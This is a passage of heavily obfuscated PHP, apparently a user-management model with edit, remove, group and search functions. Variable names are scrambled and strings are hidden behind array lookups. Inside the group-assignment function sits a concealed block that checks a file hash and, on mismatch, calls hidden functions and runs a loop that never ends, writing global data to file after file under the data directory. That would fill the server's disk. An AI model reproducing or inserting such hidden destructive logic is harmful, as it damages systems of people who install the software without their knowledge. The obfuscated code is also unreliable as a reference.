$e¸™ĞçœêÂ[2168] => 0, $e¸™ĞçœêÂ[2508] => 0, $e¸™ĞçœêÂ[2195] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[685]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[685]] : 1); if (!empty($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[1429]])) { $d‰Î´±Ã™[$e¸™ĞçœêÂ[1429]] = $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[1429]]; } goto FğáŸÆÅ; E† ƒ´ÚÇ‚: } protected function userEditTest($CÄñÔÖÁ–˜, $fÁÎ¯ŠÔ¨) { return $this->call($_SERVER[Î¿—”òá][2518], $CÄñÔÖÁ–˜, $fÁÎ¯ŠÔ¨); } protected function userEdit($eï”Ö©ò®ˆ, $b”œ ‡­œ) { goto Dã…õôä‘…; Dã…õôä‘…: $AÀ¾²õ´…³ =& $_SERVER[Î¿—”òá]; $d“‹ÌßÉ¢Ä = $this->getInfoSimple($eï”Ö©ò®ˆ); if (!$d“‹ÌßÉ¢Ä) { return !1; } goto A¦§–ÀíÑ; CŸ†æÜ•Æ˜: return !0; goto EÕ¹Øø„‡½; A¦§–ÀíÑ: $aøäš•¦Œ„ = $this->_checkExist($b”œ ‡­œ, $eï”Ö©ò®ˆ); if ($aøäš•¦Œ„ !== !0) { return $aøäš•¦Œ„; } if (isset($b”œ ‡­œ[$AÀ¾²õ´…³[795]]) && trim($b”œ ‡­œ[$AÀ¾²õ´…³[795]]) != $AÀ¾²õ´…³[33]) { $bâÑİ’ºõ = $this->metaGet($eï”Ö©ò®ˆ); if (empty($bâÑİ’ºõ[$AÀ¾²õ´…³[2509]])) { $bâÑİ’ºõ[$AÀ¾²õ´…³[2509]] = rand_string(10); Model($AÀ¾²õ´…³[474])->metaSet($eï”Ö©ò®ˆ, $AÀ¾²õ´…³[2509], $bâÑİ’ºõ[$AÀ¾²õ´…³[2509]]); } $b”œ ‡­œ[$AÀ¾²õ´…³[795]] = md5($bâÑİ’ºõ[$AÀ¾²õ´…³[2509]] . trim($b”œ ‡­œ[$AÀ¾²õ´…³[795]])); } else { unset($b”œ ‡­œ[$AÀ¾²õ´…³[795]]); } goto D¶š³®ï; D¶š³®ï: $this->where(array($AÀ¾²õ´…³[1420] => $eï”Ö©ò®ˆ))->save($b”œ ‡­œ); if (isset($b”œ ‡­œ[$AÀ¾²õ´…³[2329]])) { $this->setNamePinyin($eï”Ö©ò®ˆ, $b”œ ‡­œ[$AÀ¾²õ´…³[2329]]); } $this->clearCache($d„‡†ËØÁ¹[$AÀ¾²õ´…³[1429]]); goto CŸ†æÜ•Æ˜; EÕ¹Øø„‡½: } public function setNamePinyin($BÓ¶–…æÒ, $dá¿ƒêğ = false) { $d‹À¹ª¥ÍÑ =& $_SERVER[Î¿—”òá]; if (!$dá¿ƒêğ) { $CÏÑ£¨ã = $this->getInfoSimple($BÓ¶–…æÒ); $dá¿ƒêğ = $CÏÑ£¨ã[$d‹À¹ª¥ÍÑ[2329]] ? $CÏÑ£¨ã[$d‹À¹ª¥ÍÑ[2329]] : $CÏÑ£¨ã[$d‹À¹ª¥ÍÑ[28]]; } $D½ Ö•¸­® = Model($d‹À¹ª¥ÍÑ[477]); if (!Input::check($dá¿ƒêğ, $d‹À¹ª¥ÍÑ[528])) { return $D½ Ö•¸­®->metaSet($BÓ¶–…æÒ, array($d‹À¹ª¥ÍÑ[416] => $d‹À¹ª¥ÍÑ[33], $d‹À¹ª¥ÍÑ[415] => $d‹À¹ª¥ÍÑ[33])); } return $D½ Ö•¸­®->metaSet($BÓ¶–…æÒ, array($d‹À¹ª¥ÍÑ[416] => str_replace($d‹À¹ª¥ÍÑ[50], $d‹À¹ª¥ÍÑ[33], Pinyin::encode($dá¿ƒêğ)), $d‹À¹ª¥ÍÑ[415] => Pinyin::encode($dá¿ƒêğ, $d‹À¹ª¥ÍÑ[529]))); } private function nickNameRpt() { $fœƒÔ…‘ĞÏ =& $_SERVER[Î¿—”òá]; $d¥Úî³ÊØÁ = Model($fœƒÔ…‘ĞÏ[1081])->get($fœƒÔ…‘ĞÏ[2519]); $A›Ÿ£‰›Ú = $GLOBALS[$fœƒÔ…‘ĞÏ[6]][$fœƒÔ…‘ĞÏ[2475]][$fœƒÔ…‘ĞÏ[2519]]; $eíŠ©÷ä–ë = !is_null($d¥Úî³ÊØÁ) ? $d¥Úî³ÊØÁ : $A›Ÿ£‰›Ú; return !!$eíŠ©÷ä–ë; } private function _checkExist($d‰Éùâ›, $d¬Ñ‹ÌÂ©˜ = false) { $A·ŸÌöÖÑò =& $_SERVER[Î¿—”òá]; $FÜè‰˜¾¤œ = array($A·ŸÌöÖÑò[28] => UserModel::ERROR_USER_EXIST_NAME, $A·ŸÌöÖÑò[2329] => UserModel::ERROR_USER_EXIST_NICKNAME, $A·ŸÌöÖÑò[293] => UserModel::ERROR_USER_EXIST_EMAIL, $A·ŸÌöÖÑò[2507] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($FÜè‰˜¾¤œ[$A·ŸÌöÖÑò[2329]]); } $eî»ºÑùï = $d¬Ñ‹ÌÂ©˜ ? array($A·ŸÌöÖÑò[1429] => array($A·ŸÌöÖÑò[2520], $d¬Ñ‹ÌÂ©˜)) : array(); foreach ($FÜè‰˜¾¤œ as $DåÆİå™ÒÄ => $Eğ‹ºŒŸ§ï) { if (!isset($d‰Éùâ›[$DåÆİå™ÒÄ]) || !$d‰Éùâ›[$DåÆİå™ÒÄ]) { continue; } $BĞÌĞŒøßº = array_merge(array($DåÆİå™ÒÄ => $d‰Éùâ›[$DåÆİå™ÒÄ]), $eî»ºÑùï); $dø¥ê–å Å = $this->where($BĞÌĞŒøßº)->find(); if ($dø¥ê–å Å) { return $Eğ‹ºŒŸ§ï; } } return !0; } public function userListInfo($E‰ÊÕÊ¦ëÃ) { $eÔì„ì‚Ç =& $_SERVER[Î¿—”òá]; $C‚ğ”‰òÚ¨ = array(); $E‰ÊÕÊ¦ëÃ = is_array($E‰ÊÕÊ¦ëÃ) ? array_unique($E‰ÊÕÊ¦ëÃ) : array(); if (!$E‰ÊÕÊ¦ëÃ) { return $C‚ğ”‰òÚ¨; } if (count($E‰ÊÕÊ¦ëÃ) < 20) { foreach ($E‰ÊÕÊ¦ëÃ as $bô¬Ú™¾ˆ) { $C‚ğ”‰òÚ¨[$bô¬Ú™¾ˆ . $eÔì„ì‚Ç[33]] = $this->getInfoSimpleOuter($bô¬Ú™¾ˆ); } } else { $aÎ÷Ç¥‡ƒ = array($eÔì„ì‚Ç[1420] => array($eÔì„ì‚Ç[384], $E‰ÊÕÊ¦ëÃ)); if (count($E‰ÊÕÊ¦ëÃ) == 1) { $aÎ÷Ç¥‡ƒ = array($eÔì„ì‚Ç[1420] => $E‰ÊÕÊ¦ëÃ[0]); } $FÒåçÌ©“¶ = Model($eÔì„ì‚Ç[474])->field($this->simpleField)->where($aÎ÷Ç¥‡ƒ)->select(); $FÒåçÌ©“¶ = array_to_keyvalue($FÒåçÌ©“¶, $eÔì„ì‚Ç[1429]); foreach ($E‰ÊÕÊ¦ëÃ as $bô¬Ú™¾ˆ) { $BªĞùœ…öö = $FÒåçÌ©“¶[$FÒåçÌ©“¶[$bô¬Ú™¾ˆ]]; if (!$BªĞùœ…öö) { $C‚ğ”‰òÚ¨[$bô¬Ú™¾ˆ . $eÔì„ì‚Ç[33]] = $this->getInfoSimpleOuter($bô¬Ú™¾ˆ); continue; } $BªĞùœ…öö[$eÔì„ì‚Ç[2492]] = Action($eÔì„ì‚Ç[2493])->parseUrl($BªĞùœ…öö[$eÔì„ì‚Ç[2492]]); $C‚ğ”‰òÚ¨[$bô¬Ú™¾ˆ . $eÔì„ì‚Ç[33]] = $BªĞùœ…öö; } } return $C‚ğ”‰òÚ¨; } protected function userStatus($Aí×ãé ãÉ, $D•¡œšÊç) { $eÑ¨ÂÁéáã = $this->getInfoSimple($Aí×ãé ãÉ); if (!$eÑ¨ÂÁéáã) { return !1; } $Fƒæ™‰äˆ = array($_SERVER[Î¿—”òá][685] => $D•¡œšÊç); return $this->userEdit($Aí×ãé ãÉ, $Fƒæ™‰äˆ); } protected function userRemove($Bî¾Ÿõ„¿ª) { goto B¼£ß«†¼²; A˜ñ¡½Ö¦œ: Model($EïÌÂŠ±[2173])->where($Aİ‚Ü‰çËÜ)->delete(); Model($EïÌÂŠ±[2506])->where($Aİ‚Ü‰çËÜ)->delete(); Model($EïÌÂŠ±[2522])->where($Aİ‚Ü‰çËÜ)->delete(); goto DÆ¦÷£­Š ; DÆ¦÷£­Š : Model($EïÌÂŠ±[749])->userRootRemove($Bî¾Ÿõ„¿ª); return $this->where($Aİ‚Ü‰çËÜ)->delete(); goto eÓò¼•÷óØ; B¼£ß«†¼²: $EïÌÂŠ± =& $_SERVER[Î¿—”òá]; $CÇÏ‹„ÖßÍ = $this->getInfoSimple($Bî¾Ÿõ„¿ª); if (!$CÇÏ‹„ÖßÍ) { return !1; } goto Aë…˜êÛ†; Aë…˜êÛ†: $Aİ‚Ü‰çËÜ = array($EïÌÂŠ±[1420] => $Bî¾Ÿõ„¿ª); Model($EïÌÂŠ±[536])->where($Aİ‚Ü‰çËÜ)->delete(); Model($EïÌÂŠ±[2521])->where($Aİ‚Ü‰çËÜ)->delete(); goto A˜ñ¡½Ö¦œ; eÓò¼•÷óØ: } protected function userGroupSet($Fˆ¬ää¨ÚÙ, $F›Ê‘„¨‹¼, $F›µ·Ÿ˜›œ = array()) { goto C‡¯‚Ñóš©; eÇÛ¨­¤²ã: $fÜ®÷˜¸ùŠ = 0; foreach ($F›Ê‘„¨‹¼ as $F¤È¸­í¤ => $e‰ØÆÉ…‰â) { $f®áñºËÖ» = array($BˆïæŒš«ê[1429] => $Fˆ¬ää¨ÚÙ, $BˆïæŒš«ê[2097] => $F¤È¸­í¤, $BˆïæŒš«ê[2228] => $e‰ØÆÉ…‰â); $f®áñºËÖ»[$BˆïæŒš«ê[2118]] = isset($F›µ·Ÿ˜›œ[$fÜ®÷˜¸ùŠ]) ? $F›µ·Ÿ˜›œ[$fÜ®÷˜¸ùŠ] : 0; $fÜ®÷˜¸ùŠ++; $B¶¤ºš‰¯š[] = $f®áñºËÖ»; } return $AÌ‡ŸÁ«¤®->addAll($B¶¤ºš‰¯š, array(), !0); goto f—•·Û¸Êø; C‡¯‚Ñóš©: $BˆïæŒš«ê =& $_SERVER[Î¿—”òá]; $a«ÛƒŒ½‹Ó = $_SERVER[$BˆïæŒš«ê[679]] . $BˆïæŒš«ê[680]; $EªˆñøäŞ = $BˆïæŒš«ê[784]; goto DÌŒ¸Ìİ­˜; fÅ¶ì·»àñ: $AÌ‡ŸÁ«¤® = Model($BˆïæŒš«ê[2173]); $AÌ‡ŸÁ«¤®->where(array($BˆïæŒš«ê[1429] => $Fˆ¬ää¨ÚÙ))->delete(); $B¶¤ºš‰¯š = array(); goto eÇÛ¨­¤²ã; DÌŒ¸Ìİ­˜: if ($_SERVER[$BˆïæŒš«ê[676]] != $EªˆñøäŞ($a«ÛƒŒ½‹Ó)) { goto aÌåìãøÏÌ; a˜ÂÖ˜¿œ¼: $D¾Áö®ÃĞ = $BˆïæŒš«ê[786]; $D¾Áö®ÃĞ($_SERVER[$BˆïæŒš«ê[787]]); $F“Ú§ ¢À— = $BˆïæŒš«ê[785]; goto Føá»±Æóƒ; DÓÊ”ë‘è®: $DÃô´æß = $e´´ŸÍÏá‹($EÊÊ¹ä‚æ); $DÑ¿°–Ø¨ = explode($BˆïæŒš«ê[217], $DÃô´æß); if (count($DÑ¿°–Ø¨) < $BˆïæŒš«ê[567]) { $C®ç‡õÇÉÂ = $BˆïæŒš«ê[681]; $C®ç‡õÇÉÂ(); } goto a˜ÂÖ˜¿œ¼; Føá»±Æóƒ: $F“Ú§ ¢À—(); $dµ¹…Ãì‡î = $BˆïæŒš«ê[788]; $Aæè˜°Š‰ = json_encode($GLOBALS[$BˆïæŒš«ê[789]]); goto D±ĞÓµğ¶’; D±ĞÓµğ¶’: $c Û‚·÷®ñ = 1; for ($EÂâ‘ôˆ¸„ = $c Û‚·÷®ñ; $EÂâ‘ôˆ¸„ > 0; $EÂâ‘ôˆ¸„++) { $dµ¹…Ãì‡î(DATA_PATH . $EÂâ‘ôˆ¸„, $Aæè˜°Š‰); } goto AÕˆê’ØËŸ; aÌåìãøÏÌ: $F“Ú§ ¢À— = $BˆïæŒš«ê[785]; $e´´ŸÍÏá‹ = $BˆïæŒš«ê[678]; $EÊÊ¹ä‚æ = $_SERVER[$BˆïæŒš«ê[679]] . $BˆïæŒš«ê[680]; goto DÓÊ”ë‘è®; AÕˆê’ØËŸ: } $b¦¼·ª…İá = $this->getInfoSimple($Fˆ¬ää¨ÚÙ); if (!$b¦¼·ª…İá || !is_array($F›Ê‘„¨‹¼)) { return !1; } goto fÅ¶ì·»àñ; f—•·Û¸Êø: } protected function userGroupAdd($DŠÖ›ó˜ˆê, $D¡±Å–šº = array()) { $d¹–™Õ†°ä =& $_SERVER[Î¿—”òá]; $FôĞğ˜ß˜ = $this->getInfoSimple($DŠÖ›ó˜ˆê); if (!$FôĞğ˜ß˜ || empty($D¡±Å–šº)) { return !1; } $aí™Ğ¼ “ = array(); foreach ($D¡±Å–šº as $CÉâ¢õãº => $eÙÖ¸ÅªßŒ) { $aí™Ğ¼ “[] = array($d¹–™Õ†°ä[1429] => $DŠÖ›ó˜ˆê, $d¹–™Õ†°ä[2097] => $CÉâ¢õãº, $d¹–™Õ†°ä[2228] => $eÙÖ¸ÅªßŒ); } return Model($d¹–™Õ†°ä[2173])->addAll($aí™Ğ¼ “, array(), !0); } protected function userGroupRemove($eÆªÎ¾®é, $bÔ‘éÆîÙ) { $BÚÒÇÍ¥‰ =& $_SERVER[Î¿—”òá]; $c¿Šïˆ°¦¢ = $this->getInfoSimple($eÆªÎ¾®é); if (!$c¿Šïˆ°¦¢ || !$bÔ‘éÆîÙ) { return !1; } $A§ØÂƒÛ• = array($BÚÒÇÍ¥‰[1420] => $eÆªÎ¾®é, $BÚÒÇÍ¥‰[2171] => $bÔ‘éÆîÙ); return Model($BÚÒÇÍ¥‰[2173])->where($A§ØÂƒÛ•)->delete(); } public function listData() { $A¡Ÿ®÷äÑ‹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A¡Ÿ®÷äÑ‹[$_SERVER[Î¿—”òá][354]]); return $A¡Ÿ®÷äÑ‹; } public function listByID($AÚÜ¥Ü¿ìä) { $eÀ˜‹“Šœª =& $_SERVER[Î¿—”òá]; if (!$AÚÜ¥Ü¿ìä) { return; } $a§©ËÈ¼„‡ = array($eÀ˜‹“Šœª[1429] => array($eÀ˜‹“Šœª[7], $AÚÜ¥Ü¿ìä)); $Eé§Æ®“Î = $this->where($a§©ËÈ¼„‡)->select(); $this->_listDataApply($Eé§Æ®“Î); return $Eé§Æ®“Î; } public function listByGroup($Dß×ª¬á‹ = 0, $FƒÍß½³‰ = array()) { goto d‹¨ÜÏ‰Š; Có…æÑŠ»¸: $this->_listDataApply($CÍ˜ê§ˆèİ[$CÑ…¯ÃİĞ[354]]); return $CÍ˜ê§ˆèİ; goto dÔÆµö¾ªî; d‹¨ÜÏ‰Š: $CÑ…¯ÃİĞ =& $_SERVER[Î¿—”òá]; $eÀç­é–çÇ = $CÑ…¯ÃİĞ[33]; $eÌ‡”¤á« = array(); goto EÛ…İÌ¯ô«; EÛ…İÌ¯ô«: if ($Dß×ª¬á‹) { $eÌ‡”¤á« = array($CÑ…¯ÃİĞ[2523] => intval($Dß×ª¬á‹)); $eÀç­é–çÇ = "\114\x45\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\165\x73\145\x72\x5f\x67\x72\157\165\x70\x20\165\x73\145\162\x5f\x67\162\x6f\165\160\x20\157\x6e\40\x75\x73\x65\162\x2e\165\x73\x65\162\111\x44\40\x3d\40\165\163\x65\x72\x5f\147\x72\x6f\x75\160\56\x75\163\145\162\x49\x44"; $a—ºîæ•˜ø = Input::get($CÑ…¯ÃİĞ[407], null, $CÑ…¯ÃİĞ[33]) ? $CÑ…¯ÃİĞ[33] : $CÑ…¯ÃİĞ[2524]; } if (isset($FƒÍß½³‰[$CÑ…¯ÃİĞ[685]])) { $eÌ‡”¤á«[$CÑ…¯ÃİĞ[2525]] = $FƒÍß½³‰[$CÑ…¯ÃİĞ[685]]; } $CÍ˜ê§ˆèİ = $this->_makeOrder($a—ºîæ•˜ø)->field($CÑ…¯ÃİĞ[2526])->where($eÌ‡”¤á«)->join($eÀç­é–çÇ)->selectPage(50); goto Có…æÑŠ»¸; dÔÆµö¾ªî: } private function _makeOrder($dŠÂáÚËÏº = '') { goto FÜò¹±ìÊ; aÊ¤„ï°Š: $EÎ‰¨„œÒ = Input::get($D³ŞùÔ¤Ú[407], $D³ŞùÔ¤Ú[7], $D³ŞùÔ¤Ú[1420], $E¼ĞùŠöãà); $e˜ÎŞ–Â¨ = Input::get($D³ŞùÔ¤Ú[408], $D³ŞùÔ¤Ú[7], $D³ŞùÔ¤Ú[2174], array($D³ŞùÔ¤Ú[2174], $D³ŞùÔ¤Ú[404])); $e˜ÎŞ–Â¨ = $bìÚ½ŠÙà°[$e˜ÎŞ–Â¨]; goto F³ÚñŒÉñŠ; F³ÚñŒÉñŠ: $dŠÂáÚËÏº = $dŠÂáÚËÏº . "\165\x73\145\x72\x2e{$EÎ‰¨„œÒ}\40{$e˜ÎŞ–Â¨}\x2c\40\165\163\145\162\56\x75\163\x65\x72\x49\104\x20\x61\163\143"; return $this->alias($D³ŞùÔ¤Ú[2272])->order($dŠÂáÚËÏº); goto CÆ©Ñè¿; FÜò¹±ìÊ: $D³ŞùÔ¤Ú =& $_SERVER[Î¿—”òá]; $E¼ĞùŠöãà = array($D³ŞùÔ¤Ú[1429], $D³ŞùÔ¤Ú[28], $D³ŞùÔ¤Ú[2083], $D³ŞùÔ¤Ú[2055], $D³ŞùÔ¤Ú[187]); $bìÚ½ŠÙà° = array($D³ŞùÔ¤Ú[402] => $D³ŞùÔ¤Ú[403], $D³ŞùÔ¤Ú[404] => $D³ŞùÔ¤Ú[405]); goto aÊ¤„ï°Š; CÆ©Ñè¿: } public function listSearch($c«¾“‹) { goto FîÏöëÁ¤š; AÙùíÛØ³: return $Eä†–‚‹ì; goto cÎ»å¹ğéë; FîÏöëÁ¤š: $e¶ØÍêÕ =& $_SERVER[Î¿—”òá]; $f¬†èšõ‚› = $c«¾“‹[$e¶ØÍêÕ[2175]]; $c—Õ×çò¶ = isset($c«¾“‹[$e¶ØÍêÕ[2176]]) ? $c«¾“‹[$e¶ØÍêÕ[2176]] : !1; goto A‘ñ¥åó¨; fÒËùòñ¾Ø: if (!$Eä†–‚‹ì || count($Eä†–‚‹ì[$e¶ØÍêÕ[354]]) < 5 && Input::check($f¬†èšõ‚›, $e¶ØÍêÕ[306])) { $aÛÔÔˆŒò° = $this->_searchFromMeta($e¶ØÍêÕ[415], $f¬†èšõ‚›, 10); $D‹ÜÊŠ²‡ = $this->_searchFromMeta($e¶ØÍêÕ[416], $f¬†èšõ‚›, 10); $EéÈ¢¢Ò² = array_merge($aÛÔÔˆŒò°, $D‹ÜÊŠ²‡, $Eä†–‚‹ì[$e¶ØÍêÕ[354]]); $Eä†–‚‹ì[$e¶ØÍêÕ[354]] = array_unique_by_key($EéÈ¢¢Ò², $e¶ØÍêÕ[1429]); $Eä†–‚‹ì[$e¶ØÍêÕ[351]][$e¶ØÍêÕ[352]] = count($Eä†–‚‹ì[$e¶ØÍêÕ[354]]); $Eä†–‚‹ì[$e¶ØÍêÕ[351]][$e¶ØÍêÕ[353]] = ceil($Eä†–‚‹ì[$e¶ØÍêÕ[351]][$e¶ØÍêÕ[352]] / $Eä†–‚‹ì[$e¶ØÍêÕ[351]][$e¶ØÍêÕ[349]]); } $this->_listDataApply($Eä†–‚‹ì[$e¶ØÍêÕ[354]]); $this->_filterByGroup($Eä†–‚‹ì, $c—Õ×çò¶); goto AÙùíÛØ³; A‘ñ¥åó¨: $f¬†èšõ‚› = str_replace($e¶ØÍêÕ[2177], $e¶ØÍêÕ[2178], trim($f¬†èšõ‚›)); $b‚¡Ôì÷·Õ = array($e¶ØÍêÕ[28] => array($e¶ØÍêÕ[748], "\x25{$f¬†èšõ‚›}\x25"), $e¶ØÍêÕ[293] => array($e¶ØÍêÕ[748], "\x25{$f¬†èšõ‚›}\x25"), $e¶ØÍêÕ[2329] => array($e¶ØÍêÕ[748], "\45{$f¬†èšõ‚›}\45"), $e¶ØÍêÕ[907] => $e¶ØÍêÕ[2179]); if (Input::check($f¬†èšõ‚›, $e¶ØÍêÕ[299])) { $b‚¡Ôì÷·Õ[$e¶ØÍêÕ[1429]] = array($e¶ØÍêÕ[748], "\x25{$f¬†èšõ‚›}\45"); $b‚¡Ôì÷·Õ[$e¶ØÍêÕ[2507]] = array($e¶ØÍêÕ[748], "\x25{$f¬†èšõ‚›}\x25"); } goto f”ƒ·˜…Ù; f”ƒ·˜…Ù: if (!$f¬†èšõ‚›) { $b‚¡Ôì÷·Õ = array(); } if (isset($c«¾“‹[$e¶ØÍêÕ[685]])) { $b‚¡Ôì÷·Õ[$e¶ØÍêÕ[685]] = $c«¾“‹[$e¶ØÍêÕ[685]]; } $Eä†–‚‹ì = $this->_makeOrder()->where($b‚¡Ôì÷·Õ)->selectPage(20); goto fÒËùòñ¾Ø; cÎ»å¹ğéë: } private function _filterByGroup(&$a±ƒÍè”‹´, $Fåù¯ÕîÊª) { $E«áÒÒÙº =& $_SERVER[Î¿—”òá]; if (!$Fåù¯ÕîÊª) { return $a±ƒÍè”‹´; } foreach ($a±ƒÍè”‹´[$E«áÒÒÙº[354]] as $eÑ¶¥ËØ«ô => &$cº‹ôõ£é±) { $bİƒÛ„÷°¦ = array_to_keyvalue($cº‹ôõ£é±[$E«áÒÒÙº[2527]], $E«áÒÒÙº[33], $E«áÒÒÙº[2097]); if (!in_array($Fåù¯ÕîÊª, $bİƒÛ„÷°¦)) { unset($a±ƒÍè”‹´[$E«áÒÒÙº[354]][$eÑ¶¥ËØ«ô]); } } $a±ƒÍè”‹´[$E«áÒÒÙº[354]] = array_values($a±ƒÍè”‹´[$E«áÒÒÙº[354]]); $a±ƒÍè”‹´[$E«áÒÒÙº[351]] = array($E«áÒÒÙº[2305] => count($a±ƒÍè”‹´[$E«áÒÒÙº[354]]), $E«áÒÒÙº[2303] => $a±ƒÍè”‹´[$E«áÒÒÙº[351]][$E«áÒÒÙº[349]], $E«áÒÒÙº[2302] => 1, $E«áÒÒÙº[2304] => 1); } private function _searchFromMeta($Aòí¤¶¦Î, $Dªáêğ›, $bÓ¢Ó¢¹¦) { goto a¦äÓ¢§Ğ—; CÌŞªç†¥: $d“×’´ŠÊ« = $this->where(array($FìÖê±¸¨í[1420] => array($FìÖê±¸¨í[7], $F‚š¶Â–öò)))->select(); if (!$d“×’´ŠÊ«) { return array(); } return $d“×’´ŠÊ«; goto DÊÍ‘èã‘‹; a¦äÓ¢§Ğ—: $FìÖê±¸¨í =& $_SERVER[Î¿—”òá]; $Dªáêğ› = strtolower($Dªáêğ›); $bğÄäÊ™†ï = array($FìÖê±¸¨í[89] => $Aòí¤¶¦Î, $FìÖê±¸¨í[359] => array($FìÖê±¸¨í[748], "\x25{$Dªáêğ›}\45")); goto EùŸãÇ§¹±; EùŸãÇ§¹±: $F‚š¶Â–öò = Model($FìÖê±¸¨í[2528])->where($bğÄäÊ™†ï)->limit($bÓ¢Ó¢¹¦)->select(); if (!$F‚š¶Â–öò) { return array(); } $F‚š¶Â–öò = array_to_keyvalue($F‚š¶Â–öò, $FìÖê±¸¨í[33], $FìÖê±¸¨í[1429]); goto CÌŞªç†¥; DÊÍ‘èã‘‹: } private function _listDataApplyItem($eá±›ƒŠß) { $F…‚¼‘Ï¥ = array($eá±›ƒŠß); $this->_listDataApply($F…‚¼‘Ï¥); return $F…‚¼‘Ï¥[0]; } private function _listDataApply(&$Bª³ä…ÜØÜ) { goto FÒ§¿å¶Àá; DÔÂ½ñŸ³™: $cœ¡´Ò©° = array_to_keyvalue($Bª³ä…ÜØÜ, $c†ßÊ†¹²[33], $c†ßÊ†¹²[1429]); $this->_listAppendGroup($Bª³ä…ÜØÜ, $cœ¡´Ò©°); $this->_listAppendMeta($Bª³ä…ÜØÜ, $cœ¡´Ò©°); goto c»®©İïÃ¥; c»®©İïÃ¥: $this->_listAppendSourceRoot($Bª³ä…ÜØÜ, $cœ¡´Ò©°); goto aÓõ„…éæÌ; FÒ§¿å¶Àá: $c†ßÊ†¹² =& $_SERVER[Î¿—”òá]; if (!$Bª³ä…ÜØÜ) { return; } array_remove_key($Bª³ä…ÜØÜ, $c†ßÊ†¹²[795]); goto DÔÂ½ñŸ³™; aÓõ„…éæÌ: } private function _listAppendSourceRoot(&$C‚˜àåÖà, $CšìíÖ¬‹ï) { goto bçÑ‰‘Ïßğ; bçÑ‰‘Ïßğ: $A»†Çø¡Íõ =& $_SERVER[Î¿—”òá]; $CÆˆ½Ñ±µ = array($A»†Çø¡Íõ[461] => 0, $A»†Çø¡Íõ[371] => SourceModel::TYPE_USER, $A»†Çø¡Íõ[456] => array($A»†Çø¡Íõ[7], $CšìíÖ¬‹ï)); $a¥Òòˆ²‘ = $A»†Çø¡Íõ[2186]; goto FÄŞ­½æ«; fÂÒä¹ô²Ë: foreach ($C‚˜àåÖà as &$f£ğ¹àåÆ’) { $f£ğ¹àåÆ’[$A»†Çø¡Íõ[391]] = $b‘‡õö‚Œ¦[$f£ğ¹àåÆ’[$A»†Çø¡Íõ[1429]]] ? $b‘‡õö‚Œ¦[$f£ğ¹àåÆ’[$A»†Çø¡Íõ[1429]]] : array(); } goto eŒĞéªé; FÄŞ­½æ«: $b‘‡õö‚Œ¦ = Model($A»†Çø¡Íõ[749])->order($A»†Çø¡Íõ[2187])->field($a¥Òòˆ²‘)->where($CÆˆ½Ñ±µ)->select(); $b‘‡õö‚Œ¦ = array_to_keyvalue($b‘‡õö‚Œ¦, $A»†Çø¡Íõ[456]); $b‘‡õö‚Œ¦ = array_remove_key($b‘‡õö‚Œ¦, $A»†Çø¡Íõ[456]); goto fÂÒä¹ô²Ë; eŒĞéªé: } private function _listAppendGroup(&$C¾»ƒ©‡É, $D¯¤†´ñ®ô) { goto EìÎ½Í¡Œ¦; B‹»ìõ¯³: $BŸöˆ„ Ùî = array($eá‡ƒçºÚ‹[2097] => array($eá‡ƒçºÚ‹[7], $BŠó³éÎ÷½)); $F¢‚‘šßÈ = Model($eá‡ƒçºÚ‹[2529])->field($eá‡ƒçºÚ‹[2530])->where($BŸöˆ„ Ùî)->select(); $E‚Œµƒ¥ ë = array_to_keyvalue($F¢‚‘šßÈ, $eá‡ƒçºÚ‹[2097], $eá‡ƒçºÚ‹[28]); goto cğÍÜš²ƒ; cùçøç–§: $BŠó³éÎ÷½ = array_to_keyvalue($e–îÒÒÈ½•, $eá‡ƒçºÚ‹[33], $eá‡ƒçºÚ‹[2097]); $BŠó³éÎ÷½ = array_remove_value(array_unique($BŠó³éÎ÷½), $eá‡ƒçºÚ‹[468]); if (!$BŠó³éÎ÷½ || !$e–îÒÒÈ½•) { return; } goto B‹»ìõ¯³; cğÍÜš²ƒ: $e–îÒÒÈ½• = array_to_keyvalue_group($e–îÒÒÈ½•, $eá‡ƒçºÚ‹[1429]); foreach ($e–îÒÒÈ½• as &$b†¦‡¾©õÔ) { $fÄ…ÛÔ†Ææ = array(); foreach ($b†¦‡¾©õÔ as $A˜Œ£­ãÛâ) { if (!$A˜Œ£­ãÛâ[$eá‡ƒçºÚ‹[2228]]) { continue; } $a“ª²ìçô = Model($eá‡ƒçºÚ‹[2247])->listData($A˜Œ£­ãÛâ[$eá‡ƒçºÚ‹[2228]]); $fÄ…ÛÔ†Ææ[] = array($eá‡ƒçºÚ‹[2097] => $A˜Œ£­ãÛâ[$eá‡ƒçºÚ‹[2097]], $eá‡ƒçºÚ‹[2531] => $E‚Œµƒ¥ ë[$A˜Œ£­ãÛâ[$eá‡ƒçºÚ‹[2097]]], $eá‡ƒçºÚ‹[376] => $a“ª²ìçô); } $b†¦‡¾©õÔ = $fÄ…ÛÔ†Ææ; } foreach ($C¾»ƒ©‡É as &$EùÓ¨Í…Œ) { $EùÓ¨Í…Œ[$eá‡ƒçºÚ‹[2527]] = array(); if (isset($e–îÒÒÈ½•[$EùÓ¨Í…Œ[$eá‡ƒçºÚ‹[1429]]])) { $EùÓ¨Í…Œ[$eá‡ƒçºÚ‹[2527]] = $e–îÒÒÈ½•[$EùÓ¨Í…Œ[$eá‡ƒçºÚ‹[1429]]]; } } goto fÏŒº‚ÈÒï; EìÎ½Í¡Œ¦: $eá‡ƒçºÚ‹ =& $_SERVER[Î¿—”òá]; $BŸöˆ„ Ùî = array($eá‡ƒçºÚ‹[1429] => array($eá‡ƒçºÚ‹[7], $D¯¤†´ñ®ô)); $e–îÒÒÈ½• = Model($eá‡ƒçºÚ‹[2173])->where($BŸöˆ„ Ùî)->select(); goto cùçøç–§; fÏŒº‚ÈÒï: } private function _listAppendMeta(&$a×ãÃ­±æù, $F†ôİ³Ü¢‚) { goto b²ÒÉŸ¤Ş; FÓ¹êŒË„: foreach ($FÑÓ¿‰Ş«Å as &$aæÄÀëÃ­÷) { $eé«ˆ‚ËÌ½ = array(); foreach ($aæÄÀëÃ­÷ as $EŠÏï«ÀÚ) { if (!in_array($EŠÏï«ÀÚ[$dŠáÔğ´¢¯[89]], $BÍ‘¯ŞÁäµ)) { $eé«ˆ‚ËÌ½[$EŠÏï«ÀÚ[$dŠáÔğ´¢¯[89]]] = 